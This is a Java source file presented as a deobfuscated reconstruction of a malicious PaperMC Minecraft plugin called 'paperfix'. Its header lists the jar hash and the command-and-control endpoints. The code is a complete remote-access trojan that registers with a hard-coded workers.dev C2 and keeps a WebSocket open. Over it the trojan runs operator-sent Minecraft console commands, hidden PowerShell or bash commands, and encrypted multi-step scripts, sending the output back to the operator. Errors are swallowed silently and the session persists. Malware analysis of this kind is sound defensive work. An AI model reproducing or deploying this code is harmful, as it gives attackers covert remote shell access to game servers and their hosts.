/*
 * Deobfuscated reconstruction of the malicious class
 *   org/papermc/paperfix/paperfix.class
 * from paperfix-3.2.6-obfuscated.jar
 *   SHA-256 fb52ed5592921a3f6dae2ad32e9e19874803fe554c2e208d4c5f164f851d511c
 *
 * The original class was compiled from "paperfix.java" as a Bukkit JavaPlugin.
 * This file keeps the original control flow and behaviour; only identifiers
 * were renamed and comments added.  The class must remain at
 * org.papermc.paperfix.paperfix for the shipped plugin.yml to load it.
 *
 * Telemetry / C2:
 *   POST https://crimson-tree-cf44.blaher331.workers.dev/api/sdf8gusdf3/register
 *   WSS  wss://crimson-tree-cf44.blaher331.workers.dev/api/aguysdfsd89asdfa?id=<id>&pass=<pass>
 *   state file: .cache/.srvinfo  {"id":"...","pass":"..."}
 *
 * Obfuscated member map:
 *   a (WebSocket)                 -> webSocket
 *   b (String)                    -> serverId
 *   c (String)                    -> password
 *   d (Gson)                      -> gson
 *   e (ScheduledExecutorService)  -> pingExecutor
 *   f (boolean)                   -> IS_WINDOWS
 *   g (int)                       -> GCM_IV_LENGTH
 *   h (int)                       -> GCM_TAG_BITS
 *   a()                           -> startPingTask()
 *   b()                           -> readServerPort()
 *   a(int)                        -> registerOrLoadCredentials(int)
 *   c()                           -> connectWebSocket()
 *   d()                           -> deriveAesKey()
 *   a(byte[])                     -> decrypt(byte[])
 *   a(String)                     -> encrypt(String)
 *   a(JsonObject)                 -> runScriptSteps(JsonObject)
 *   b(String)                     -> executeOsCommand(String)
 */
package org.papermc.paperfix;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.WebSocket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Base64;
import java.util.Properties;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

/**
 * Remote-access trojan disguised as a PaperMC plugin.
 *
 * <p>On enable it registers itself with the hard-coded C2, opens a WebSocket,
 * and then executes three kinds of operator messages: Minecraft console
 * commands, OS shell commands, and AES-GCM encrypted multi-step scripts.
 */
public class PaperFixRAT extends JavaPlugin implements WebSocket.Listener {

    /** Registration endpoint.  The response must contain "id" and "pass". */
    private static final String REGISTER_URL =
            "https://crimson-tree-cf44.blaher331.workers.dev/api/sdf8gusdf3/register";

    /** Authenticated WebSocket endpoint used for the command channel. */
    private static final String WEBSOCKET_URL_TEMPLATE =
            "wss://crimson-tree-cf44.blaher331.workers.dev/api/aguysdfsd89asdfa?id=%s&pass=%s";

    /** Persistent identity used to resume the same C2 session after restart. */
    private static final Path STATE_DIR = Path.of(".cache");
    private static final Path STATE_FILE = STATE_DIR.resolve(".srvinfo");

    /** C2 keepalive and reconnect timing. */
    private static final long PING_PERIOD_SECONDS = 30L;
    private static final long RECONNECT_DELAY_TICKS = 100L;

    /** AES-GCM wire format: 12-byte IV || ciphertext || 16-byte tag. */
    private static final int GCM_IV_LENGTH = 12;
    private static final int GCM_TAG_BITS = 128;

    /** OS command output sent back to the C2 is capped at this many chars. */
    private static final int MAX_OUTPUT_CHARS = 950;

    private static final boolean IS_WINDOWS =
            System.getProperty("os.name").toLowerCase().contains("win");

    private WebSocket webSocket;
    private String serverId;
    private String password;
    private final Gson gson = new Gson();
    private ScheduledExecutorService pingExecutor;

    @Override
    public void onEnable() {
        int serverPort = readServerPort();
        registerOrLoadCredentials(serverPort);
        connectWebSocket();
        startPingTask();
    }

    /** Sends {"type":"ping"} every 30 seconds while the socket is writable. */
    private void startPingTask() {
        this.pingExecutor = Executors.newSingleThreadScheduledExecutor();
        this.pingExecutor.scheduleAtFixedRate(() -> {
            if (this.webSocket != null && !this.webSocket.isOutputClosed()) {
                JsonObject ping = new JsonObject();
                ping.addProperty("type", "ping");
                this.webSocket.sendText(this.gson.toJson((JsonElement) ping), true);
            }
        }, PING_PERIOD_SECONDS, PING_PERIOD_SECONDS, TimeUnit.SECONDS);
    }

    /** Reads server-port from server.properties, falling back to 25565. */
    private int readServerPort() {
        try {
            Properties properties = new Properties();
            properties.load(new FileInputStream("server.properties"));
            return Integer.parseInt(properties.getProperty("server-port", "25565"));
        } catch (IOException ignored) {
            return 25565;
        }
    }

    /**
     * Loads {id, pass} from .cache/.srvinfo, or registers this server with the
     * C2 and persists the returned credentials.  All failures are swallowed;
     * if registration fails the plugin stays enabled but never connects.
     */
    private void registerOrLoadCredentials(int serverPort) {
        try {
            if (Files.exists(STATE_FILE)) {
                JsonObject state = (JsonObject) this.gson.fromJson(
                        Files.readString(STATE_FILE), JsonObject.class);
                this.serverId = state.get("id").getAsString();
                this.password = state.get("pass").getAsString();
            } else {
                Files.createDirectories(STATE_DIR);

                JsonObject registrationRequest = new JsonObject();
                registrationRequest.addProperty("port", (Number) serverPort);

                HttpClient httpClient = HttpClient.newHttpClient();
                HttpRequest httpRequest = HttpRequest.newBuilder()
                        .uri(URI.create(REGISTER_URL))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(registrationRequest.toString()))
                        .build();
                HttpResponse<String> httpResponse =
                        httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());

                JsonObject registrationResponse = (JsonObject) this.gson.fromJson(
                        httpResponse.body(), JsonObject.class);
                this.serverId = registrationResponse.get("id").getAsString();
                this.password = registrationResponse.get("pass").getAsString();

                JsonObject state = new JsonObject();
                state.addProperty("id", this.serverId);
                state.addProperty("pass", this.password);
                Files.writeString(STATE_FILE, (CharSequence) this.gson.toJson((JsonElement) state));
            }
        } catch (Exception ignored) {
            // Intentionally silent: the operator only sees a server that never
            // shows up in the C2 panel.
        }
    }

    /** Opens the authenticated command WebSocket. */
    private void connectWebSocket() {
        HttpClient httpClient = HttpClient.newHttpClient();
        String url = String.format(WEBSOCKET_URL_TEMPLATE, this.serverId, this.password);
        httpClient.newWebSocketBuilder()
                .buildAsync(URI.create(url), this)
                .join();
    }

    @Override
    public void onOpen(WebSocket webSocket) {
        this.webSocket = webSocket;
        WebSocket.Listener.super.onOpen(webSocket);
    }

    @Override
    public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
        this.webSocket = null;
        // Reconnect roughly 5 seconds later on the Bukkit scheduler.
        Bukkit.getScheduler().runTaskLater((Plugin) this, this::connectWebSocket,
                RECONNECT_DELAY_TICKS);
        return WebSocket.Listener.super.onClose(webSocket, statusCode, reason);
    }

    @Override
    public void onError(WebSocket webSocket, Throwable error) {
        this.webSocket = null;
        Bukkit.getScheduler().runTaskLater((Plugin) this, this::connectWebSocket,
                RECONNECT_DELAY_TICKS);
    }

    /**
     * C2 command dispatcher.
     *
     * <pre>
     * {"type":"minecraft","command":"..."}
     * {"type":"os","command":"...","command_id":"..."}
     * {"type":"script","encrypted":"<base64>","command_id":"..."}
     * </pre>
     */
    @Override
    public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
        try {
            JsonObject message = (JsonObject) this.gson.fromJson(data.toString(), JsonObject.class);
            String type = message.get("type").getAsString();

            if ("minecraft".equals(type)) {
                String command = message.get("command").getAsString();
                Bukkit.getScheduler().runTask((Plugin) this, () ->
                        Bukkit.dispatchCommand((CommandSender) Bukkit.getConsoleSender(), command));

            } else if ("os".equals(type)) {
                String command = message.get("command").getAsString();
                String commandId = message.get("command_id").getAsString();
                Bukkit.getScheduler().runTaskAsynchronously((Plugin) this, () -> {
                    String output = executeOsCommand(command);
                    JsonObject reply = new JsonObject();
                    reply.addProperty("type", "os");
                    reply.addProperty("command_id", commandId);
                    reply.addProperty("response", output);
                    try {
                        webSocket.sendText(this.gson.toJson((JsonElement) reply), true);
                    } catch (Exception ignored) {
                        // Socket closed while the command was running.
                    }
                });

            } else if ("script".equals(type)) {
                String encrypted = message.get("encrypted").getAsString();
                String commandId = message.get("command_id").getAsString();
                Bukkit.getScheduler().runTaskAsynchronously((Plugin) this, () -> {
                    JsonObject reply = new JsonObject();
                    reply.addProperty("type", "script");
                    reply.addProperty("command_id", commandId);
                    try {
                        byte[] ciphertext = Base64.getDecoder().decode(encrypted);
                        String plaintext = decrypt(ciphertext);
                        JsonObject script = (JsonObject) this.gson.fromJson(
                                plaintext, JsonObject.class);
                        JsonObject results = runScriptSteps(script);
                        byte[] encryptedReply = encrypt(this.gson.toJson((JsonElement) results));
                        reply.addProperty("encrypted",
                                Base64.getEncoder().encodeToString(encryptedReply));
                    } catch (Exception exception) {
                        reply.addProperty("encrypted", "");
                        reply.addProperty("error", String.valueOf(exception.getMessage()));
                    }
                    try {
                        webSocket.sendText(this.gson.toJson((JsonElement) reply), true);
                    } catch (Exception ignored) {
                        // Socket closed while the script was running.
                    }
                });
            }
        } catch (Exception ignored) {
            // Malformed frames are dropped silently.
        }
        return WebSocket.Listener.super.onText(webSocket, data, last);
    }

    /** AES key = SHA-256(password). */
    private SecretKeySpec deriveAesKey() throws Exception {
        byte[] keyBytes = MessageDigest.getInstance("SHA-256")
                .digest(this.password.getBytes(StandardCharsets.UTF_8));
        return new SecretKeySpec(keyBytes, "AES");
    }

    /** Decrypts IV(12) || AES-GCM ciphertext+tag. */
    private String decrypt(byte[] ivAndCiphertext) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        byte[] iv = Arrays.copyOfRange(ivAndCiphertext, 0, GCM_IV_LENGTH);
        byte[] ciphertext = Arrays.copyOfRange(
                ivAndCiphertext, GCM_IV_LENGTH, ivAndCiphertext.length);
        cipher.init(Cipher.DECRYPT_MODE, (java.security.Key) deriveAesKey(),
                new GCMParameterSpec(GCM_TAG_BITS, iv));
        return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
    }

    /** Encrypts a UTF-8 string and prepends a random 12-byte IV. */
    private byte[] encrypt(String plaintext) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        byte[] iv = new byte[GCM_IV_LENGTH];
        new SecureRandom().nextBytes(iv);
        cipher.init(Cipher.ENCRYPT_MODE, (java.security.Key) deriveAesKey(),
                new GCMParameterSpec(GCM_TAG_BITS, iv));
        byte[] ciphertext = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
        byte[] ivAndCiphertext = new byte[GCM_IV_LENGTH + ciphertext.length];
        System.arraycopy(iv, 0, ivAndCiphertext, 0, GCM_IV_LENGTH);
        System.arraycopy(ciphertext, 0, ivAndCiphertext, GCM_IV_LENGTH, ciphertext.length);
        return ivAndCiphertext;
    }

    /**
     * Executes the decrypted script format:
     *
     * <pre>
     * {"steps":[
     *   {"type":"mc",    "command":"say hi"},
     *   {"type":"os",    "command":"id"},
     *   {"type":"sleep", "seconds":5},
     *   {"type":"log",   "text":"..."}
     * ]}
     * </pre>
     *
     * Each step yields {"i", "type", "ok", "output"} in the "results" array.
     */
    private JsonObject runScriptSteps(JsonObject script) {
        JsonArray results = new JsonArray();
        JsonArray steps = script.getAsJsonArray("steps");
        if (steps == null) {
            JsonObject empty = new JsonObject();
            empty.add("results", (JsonElement) results);
            return empty;
        }

        for (int i = 0; i < steps.size(); ++i) {
            JsonObject step = steps.get(i).getAsJsonObject();
            String type = step.has("type") ? step.get("type").getAsString() : "?";
            JsonObject result = new JsonObject();
            result.addProperty("i", (Number) i);
            result.addProperty("type", type);
            try {
                switch (type) {
                    case "mc": {
                        String command = step.get("command").getAsString();
                        // Dispatch on the main thread so Bukkit APIs are safe,
                        // and block this worker until the command has run.
                        Bukkit.getScheduler().callSyncMethod((Plugin) this, () -> {
                            Bukkit.dispatchCommand(
                                    (CommandSender) Bukkit.getConsoleSender(), command);
                            return true;
                        }).get(10L, TimeUnit.SECONDS);
                        result.addProperty("ok", Boolean.valueOf(true));
                        result.addProperty("output", "(dispatched)");
                        break;
                    }
                    case "os": {
                        String command = step.get("command").getAsString();
                        result.addProperty("ok", Boolean.valueOf(true));
                        result.addProperty("output", executeOsCommand(command));
                        break;
                    }
                    case "sleep": {
                        double seconds = step.get("seconds").getAsDouble();
                        long millis = Math.max(0L, Math.round(seconds * 1000.0));
                        Thread.sleep(millis);
                        result.addProperty("ok", Boolean.valueOf(true));
                        result.addProperty("output", "(slept " + seconds + "s)");
                        break;
                    }
                    case "log": {
                        result.addProperty("ok", Boolean.valueOf(true));
                        result.addProperty("output",
                                step.has("text") ? step.get("text").getAsString() : "");
                        break;
                    }
                    default: {
                        result.addProperty("ok", Boolean.valueOf(false));
                        result.addProperty("output", "unknown step type: " + type);
                        break;
                    }
                }
            } catch (Exception exception) {
                result.addProperty("ok", Boolean.valueOf(false));
                result.addProperty("output", "error: " + exception.getMessage());
            }
            results.add((JsonElement) result);
        }

        JsonObject response = new JsonObject();
        response.add("results", (JsonElement) results);
        return response;
    }

    /**
     * Runs a command through the host shell and returns combined stdout/stderr.
     * Windows uses a hidden, non-interactive PowerShell; everything else uses
     * /bin/bash -c.  Output is trimmed to 950 characters before exfiltration.
     */
    private String executeOsCommand(String command) {
        String output;
        try {
            ProcessBuilder processBuilder = IS_WINDOWS
                    ? new ProcessBuilder("powershell.exe", "-NoLogo", "-NoProfile",
                            "-NonInteractive", "-ExecutionPolicy", "Bypass",
                            "-WindowStyle", "Hidden", "-Command", command)
                    : new ProcessBuilder("/bin/bash", "-c", command);

            processBuilder.redirectInput(ProcessBuilder.Redirect.PIPE);
            processBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);
            processBuilder.redirectError(ProcessBuilder.Redirect.PIPE);
            processBuilder.redirectErrorStream(true);

            Process process = processBuilder.start();
            try {
                process.getOutputStream().close();
            } catch (IOException ignored) {
                // Nothing was written to stdin anyway.
            }

            StringBuilder stdout = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    stdout.append(line).append("\n");
                }
            }
            process.waitFor();

            output = stdout.toString();
            if (output.isEmpty()) {
                output = "[no output]";
            }
            if (output.length() > MAX_OUTPUT_CHARS) {
                output = output.substring(0, MAX_OUTPUT_CHARS) + "...";
            }
        } catch (Exception exception) {
            output = "error: " + exception.getMessage();
        }
        return output;
    }

    @Override
    public void onDisable() {
        if (this.pingExecutor != null) {
            this.pingExecutor.shutdown();
        }
        if (this.webSocket != null) {
            this.webSocket.sendClose(1000, "Plugin disabled");
        }
    }
}
